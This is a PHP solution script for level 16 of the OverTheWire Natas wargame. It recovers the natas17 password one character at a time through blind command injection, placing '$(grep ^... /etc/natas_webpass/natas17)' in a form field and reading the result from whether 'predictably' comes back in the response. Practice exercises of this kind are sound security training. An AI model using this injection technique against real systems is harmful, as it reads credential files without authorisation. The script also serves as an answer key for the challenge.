<?php
require_once dirname(__DIR__) . '/bootstrap.php';

$level = 16;
$username = 'natas' . $level;
$password = readFlag($level - 1);
$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
$seenPassword = "";

while (strlen($seenPassword) < 32) {
    for ($i = 0; $i < strlen($chars); $i++) {
        $attempt = $seenPassword . $chars[$i];
        echo 'Trying ' . $attempt . "\n";

        $response = $client->request('POST', $url, [
            'auth' => [$username, $password],
            'form_params' => [
                'needle' => 'predictably$(grep ^' . $attempt . ' /etc/natas_webpass/natas17)', //grep -i "predictably$(grep ^attempt /etc/natas_webpass/natas17)" dictionary.txt"
            ]
        ]);
        $body = (string)$response->getBody();

        if (stripos($body, "predictably") === false) {
            $seenPassword .= $chars[$i];

            break;
        }
    }
}

echo "\n";
echo $seenPassword;
